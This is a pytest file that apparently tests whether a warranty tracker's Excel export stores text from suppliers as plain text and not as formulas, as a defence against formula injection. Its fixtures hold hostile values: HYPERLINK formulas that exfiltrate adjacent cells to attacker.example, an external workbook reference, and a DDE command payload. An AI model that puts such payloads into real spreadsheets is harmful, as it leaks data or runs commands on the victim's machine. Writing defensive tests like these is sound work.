"""Warranty-register export must not store supplier text as Excel formulas.

These tests execute the implementation in
``1_DDC_Toolkit/Closeout/warranty-tracker/SKILL.md`` (the first Python block).
They fail while ``export_to_excel`` writes a leading ``=`` as a worksheet
formula, and they pass once every text cell on the Warranties, Claims, and
Expiring Soon sheets is stored as plain text.

Fields ``export_to_excel`` does not write are out of scope: coverage details,
exclusions, contact name, contact phone, location, notes, document names, and
claim ``reported_by``. The skill has no CSV writer.
"""

from __future__ import annotations

import re
import zipfile
from datetime import date, timedelta
from pathlib import Path
from xml.etree import ElementTree as ET

import pytest

SKILL_PATH = (
    Path(__file__).resolve().parents[1]
    / "1_DDC_Toolkit"
    / "Closeout"
    / "warranty-tracker"
    / "SKILL.md"
)

MAIN_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
REL_NS = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
PKG_REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
NS = {"m": MAIN_NS}

# Supplier-controlled strings. example is a documentation domain; nothing is contacted.
ITEM_LINK = '=HYPERLINK("https://attacker.example/?d="&H2,"Warranty certificate")'
MANUFACTURER_LINK = '=HYPERLINK("https://attacker.example/?m="&L2,"manufacturer")'
CONTRACTOR_LINK = '=HYPERLINK("https://attacker.example/?c="&B2,"contractor")'
CONTACT_LINK = "='https://attacker.example/leak.xlsx'!Sheet1!A1"
ISSUE_LINK = '=HYPERLINK("https://attacker.example/?i="&C2,"issue")'
RESOLUTION_LINK = '=HYPERLINK("https://attacker.example/?r="&C2,"resolution")'
EXPIRING_ITEM = '=HYPERLINK("https://attacker.example/?e="&D2,"expiring item")'
EXPIRING_MANUFACTURER = '=HYPERLINK("https://attacker.example/?e="&H2,"expiring manufacturer")'
EXPIRING_CONTRACTOR = '=HYPERLINK("https://attacker.example/?e="&E2,"expiring contractor")'
EXPIRING_CONTACT = '=HYPERLINK("https://attacker.example/?e="&B2,"expiring contact")'

OTHER_MARKERS = {
    "item_description": '+HYPERLINK("https://attacker.example/plus","plus")',
    "manufacturer": "-cmd|'/c calc'!A0",
    "contractor": "@SUM(A1:A2)",
    "contact_email": "\t=1+1",
    "issue_description": "\r=HYPERLINK(\"https://attacker.example/cr\",\"cr\")",
    "resolution": "\t@SUM(1+1)",
}


def _load_skill_namespace():
    text = SKILL_PATH.read_text(encoding="utf-8")
    match = re.search(r"```python\n(.*?)```", text, re.DOTALL)
    if match is None:
        raise AssertionError(f"no Python implementation block in {SKILL_PATH}")
    namespace = {"__file__": str(SKILL_PATH)}
    exec(compile(match.group(1), "<warranty-tracker SKILL.md>", "exec"), namespace)
    return namespace


@pytest.fixture(scope="module")
def skill():
    return _load_skill_namespace()


def _shared_strings(archive: zipfile.ZipFile) -> list[str]:
    name = "xl/sharedStrings.xml"
    if name not in archive.namelist():
        return []
    root = ET.fromstring(archive.read(name))
    values = []
    for item in root.findall("m:si", NS):
        values.append("".join(node.text or "" for node in item.findall(".//m:t", NS)))
    return values


class _Sheet:
    def __init__(self, root: ET.Element, shared: list[str]):
        self.root = root
        self.shared = shared


def _sheet_roots(path: Path) -> dict[str, _Sheet]:
    with zipfile.ZipFile(path) as archive:
        shared = _shared_strings(archive)
        workbook = ET.fromstring(archive.read("xl/workbook.xml"))
        rels = ET.fromstring(archive.read("xl/_rels/workbook.xml.rels"))
        targets = {
            rel.attrib["Id"]: rel.attrib["Target"]
            for rel in rels.findall(f"{{{PKG_REL_NS}}}Relationship")
        }
        sheets = {}
        for sheet in workbook.findall("m:sheets/m:sheet", NS):
            target = targets[sheet.attrib[f"{{{REL_NS}}}id"]]
            if target.startswith("/"):
                target = target.lstrip("/")
            elif not target.startswith("xl/"):
                target = "xl/" + target
            root = ET.fromstring(archive.read(target))
            sheets[sheet.attrib["name"]] = _Sheet(root, shared)
        return sheets


def _cell_text_and_formula(sheet: _Sheet, element: ET.Element) -> tuple[str | None, str | None]:
    formula = element.find("m:f", NS)
    formula_text = None if formula is None else formula.text
    cell_type = element.attrib.get("t")
    if cell_type == "inlineStr":
        text = "".join(node.text or "" for node in element.findall(".//m:t", NS))
        return text, formula_text
    value = element.find("m:v", NS)
    if cell_type == "s" and value is not None and value.text is not None:
        return sheet.shared[int(value.text)], formula_text
    if formula_text is not None:
        return None, formula_text
    if value is None:
        return None, formula_text
    return value.text, formula_text


def _table(sheet: _Sheet) -> list[dict[str, tuple[str | None, str | None, str]]]:
    """Rows of header -> (text, formula, cell reference), excluding the header row."""
    by_row: dict[int, dict[str, tuple[str | None, str | None, str]]] = {}
    headers: dict[str, str] = {}
    for cell in sheet.root.findall("m:sheetData/m:row/m:c", NS):
        ref = cell.attrib.get("r")
        if not ref:
            continue
        match = re.fullmatch(r"([A-Z]+)(\d+)", ref)
        if match is None:
            continue
        column, row_number = match.group(1), int(match.group(2))
        text, formula = _cell_text_and_formula(sheet, cell)
        if row_number == 1:
            headers[column] = text or ""
            continue
        header = headers.get(column)
        if header:
            by_row.setdefault(row_number, {})[header] = (text, formula, ref)
    return [by_row[number] for number in sorted(by_row)]


def _require_row(rows, column: str, expected: str) -> dict:
    for row in rows:
        text, _formula, _ref = row.get(column, (None, None, ""))
        if text == expected:
            return row
    found = [row.get(column, (None, None, ""))[0] for row in rows]
    raise AssertionError(f"no row with {column}={expected!r}; saw {found!r}")


def _xml_text(value: str) -> str:
    """Match XML 1.0 line-break normalization applied when the sheet is parsed."""
    return value.replace("\r\n", "\n").replace("\r", "\n")


def _assert_plain_text(row: dict, column: str, submitted: str, sheet: str) -> None:
    if column not in row:
        raise AssertionError(f"{sheet} has no {column!r} column")
    text, formula, ref = row[column]
    assert formula is None, (
        f"{sheet}!{ref} ({column}) stored a formula {formula!r} "
        f"from submitted text {submitted!r}"
    )
    accepted = {_xml_text(submitted), _xml_text("'" + submitted)}
    assert _xml_text(text or "") in accepted, (
        f"{sheet}!{ref} ({column}) should keep the submitted text as a "
        f"string or with one leading apostrophe; got {text!r}"
    )


def _tracker(skill, completion: date):
    return skill["WarrantyTracker"](
        project_name="Office Tower",
        substantial_completion_date=completion,
    )


def _add(skill, tracker, **kwargs):
    defaults = dict(
        system=skill["BuildingSystem"].HVAC,
        warranty_type=skill["WarrantyType"].MANUFACTURER,
        duration_years=5,
        coverage_details="Parts and labor for manufacturing defects",
        start_date=None,
    )
    defaults.update(kwargs)
    return tracker.add_warranty(**defaults)


def test_export_writes_supplier_formula_text_as_values(skill, tmp_path: Path):
    """Leading '=' in every exported text field must not become a formula cell."""
    today = date.today()
    tracker = _tracker(skill, today)
    active = _add(
        skill,
        tracker,
        item_description=ITEM_LINK,
        manufacturer=MANUFACTURER_LINK,
        contractor=CONTRACTOR_LINK,
        contact_email=CONTACT_LINK,
        duration_years=5,
        start_date=today,
    )
    claim = tracker.file_claim(
        warranty_id=active.warranty_id,
        issue_description=ISSUE_LINK,
        issue_date=today,
        reported_by="Building Manager",
    )
    tracker.update_claim_status(
        claim.claim_id,
        skill["ClaimStatus"].RESOLVED,
        resolution=RESOLUTION_LINK,
        cost_covered=250.0,
    )

    expiring_start = today - timedelta(days=200)
    expiring = _add(
        skill,
        tracker,
        item_description=EXPIRING_ITEM,
        manufacturer=EXPIRING_MANUFACTURER,
        contractor=EXPIRING_CONTRACTOR,
        contact_email=EXPIRING_CONTACT,
        duration_years=1,
        start_date=expiring_start,
        system=skill["BuildingSystem"].ROOFING,
        warranty_type=skill["WarrantyType"].CONTRACTOR,
    )
    # Same end-date rule as WarrantyTracker.add_warranty / generate_expiration_report(6).
    expiring_end = expiring_start + timedelta(days=365)
    assert expiring_end <= today + timedelta(days=180)
    assert (today + timedelta(days=5 * 365)) > today + timedelta(days=180)

    output = tmp_path / "warranty_register.xlsx"
    tracker.export_to_excel(str(output))
    sheets = _sheet_roots(output)

    problems: list[str] = []

    def check(row: dict, column: str, submitted: str, sheet: str) -> None:
        try:
            _assert_plain_text(row, column, submitted, sheet)
        except AssertionError as exc:
            problems.append(str(exc))

    warranties = _table(sheets["Warranties"])
    active_row = _require_row(warranties, "warranty_id", active.warranty_id)
    expiring_row = _require_row(warranties, "warranty_id", expiring.warranty_id)
    for column, submitted in (
        ("item", ITEM_LINK),
        ("manufacturer", MANUFACTURER_LINK),
        ("contractor", CONTRACTOR_LINK),
        ("contact", CONTACT_LINK),
    ):
        check(active_row, column, submitted, "Warranties")
    for column, submitted in (
        ("item", EXPIRING_ITEM),
        ("manufacturer", EXPIRING_MANUFACTURER),
        ("contractor", EXPIRING_CONTRACTOR),
        ("contact", EXPIRING_CONTACT),
    ):
        check(expiring_row, column, submitted, "Warranties")

    claims = _table(sheets["Claims"])
    claim_row = _require_row(claims, "Claim ID", claim.claim_id)
    for column, submitted in (
        ("Item", ITEM_LINK),
        ("Issue", ISSUE_LINK),
        ("Resolution", RESOLUTION_LINK),
    ):
        check(claim_row, column, submitted, "Claims")

    expiring_rows = _table(sheets["Expiring Soon"])
    soon = _require_row(expiring_rows, "Warranty ID", expiring.warranty_id)
    for column, submitted in (
        ("Item", EXPIRING_ITEM),
        ("Manufacturer", EXPIRING_MANUFACTURER),
        ("Contact", EXPIRING_CONTACT),
    ):
        check(soon, column, submitted, "Expiring Soon")
    assert all(
        row.get("Warranty ID", (None, None, ""))[0] != active.warranty_id
        for row in expiring_rows
    )

    for name, sheet in sheets.items():
        formulas = [
            cell.attrib.get("r")
            for cell in sheet.root.findall("m:sheetData/m:row/m:c", NS)
            if cell.find("m:f", NS) is not None
        ]
        if formulas:
            problems.append(f"{name} contains formula cells at {formulas}")
    assert problems == [], "\n".join(problems)


def test_export_preserves_ordinary_warranty_and_claim_text(skill, tmp_path: Path):
    today = date.today()
    tracker = _tracker(skill, today)
    warranty = _add(
        skill,
        tracker,
        item_description="HVAC System - Rooftop Units",
        manufacturer="Carrier",
        contractor="ABC Mechanical",
        contact_email="warranty@carrier.example",
        duration_years=1,
        start_date=today - timedelta(days=200),
    )
    claim = tracker.file_claim(
        warranty.warranty_id,
        "RTU-1 compressor failure",
        today,
        "Building Manager",
    )
    tracker.update_claim_status(
        claim.claim_id,
        skill["ClaimStatus"].RESOLVED,
        resolution="Replaced compressor under warranty",
        cost_covered=250.0,
    )
    output = tmp_path / "warranty_register.xlsx"
    tracker.export_to_excel(str(output))
    sheets = _sheet_roots(output)

    warranties = _require_row(_table(sheets["Warranties"]), "warranty_id", warranty.warranty_id)
    _assert_plain_text(warranties, "item", "HVAC System - Rooftop Units", "Warranties")
    _assert_plain_text(warranties, "manufacturer", "Carrier", "Warranties")
    _assert_plain_text(warranties, "contractor", "ABC Mechanical", "Warranties")
    _assert_plain_text(warranties, "contact", "warranty@carrier.example", "Warranties")

    claims = _require_row(_table(sheets["Claims"]), "Claim ID", claim.claim_id)
    _assert_plain_text(claims, "Item", "HVAC System - Rooftop Units", "Claims")
    _assert_plain_text(claims, "Issue", "RTU-1 compressor failure", "Claims")
    _assert_plain_text(claims, "Resolution", "Replaced compressor under warranty", "Claims")

    soon = _require_row(_table(sheets["Expiring Soon"]), "Warranty ID", warranty.warranty_id)
    _assert_plain_text(soon, "Item", "HVAC System - Rooftop Units", "Expiring Soon")
    _assert_plain_text(soon, "Manufacturer", "Carrier", "Expiring Soon")
    _assert_plain_text(soon, "Contact", "warranty@carrier.example", "Expiring Soon")


def test_other_formula_markers_stay_text_on_every_exported_field(skill, tmp_path: Path):
    """'+', '-', '@', tab, and CR are not formula cells in this xlsx writer.

    A fix may leave them unchanged or prefix one apostrophe. Either is plain text.
    """
    today = date.today()
    tracker = _tracker(skill, today)
    warranty = _add(
        skill,
        tracker,
        item_description=OTHER_MARKERS["item_description"],
        manufacturer=OTHER_MARKERS["manufacturer"],
        contractor=OTHER_MARKERS["contractor"],
        contact_email=OTHER_MARKERS["contact_email"],
        duration_years=1,
        start_date=today - timedelta(days=200),
    )
    claim = tracker.file_claim(
        warranty.warranty_id,
        OTHER_MARKERS["issue_description"],
        today,
        "Building Manager",
    )
    tracker.update_claim_status(
        claim.claim_id,
        skill["ClaimStatus"].RESOLVED,
        resolution=OTHER_MARKERS["resolution"],
        cost_covered=1.0,
    )
    output = tmp_path / "warranty_register.xlsx"
    tracker.export_to_excel(str(output))
    sheets = _sheet_roots(output)

    warranties = _require_row(_table(sheets["Warranties"]), "warranty_id", warranty.warranty_id)
    _assert_plain_text(warranties, "item", OTHER_MARKERS["item_description"], "Warranties")
    _assert_plain_text(warranties, "manufacturer", OTHER_MARKERS["manufacturer"], "Warranties")
    _assert_plain_text(warranties, "contractor", OTHER_MARKERS["contractor"], "Warranties")
    _assert_plain_text(warranties, "contact", OTHER_MARKERS["contact_email"], "Warranties")

    claims = _require_row(_table(sheets["Claims"]), "Claim ID", claim.claim_id)
    _assert_plain_text(claims, "Item", OTHER_MARKERS["item_description"], "Claims")
    _assert_plain_text(claims, "Issue", OTHER_MARKERS["issue_description"], "Claims")
    _assert_plain_text(claims, "Resolution", OTHER_MARKERS["resolution"], "Claims")

    soon = _require_row(_table(sheets["Expiring Soon"]), "Warranty ID", warranty.warranty_id)
    _assert_plain_text(soon, "Item", OTHER_MARKERS["item_description"], "Expiring Soon")
    _assert_plain_text(soon, "Manufacturer", OTHER_MARKERS["manufacturer"], "Expiring Soon")
    _assert_plain_text(soon, "Contact", OTHER_MARKERS["contact_email"], "Expiring Soon")
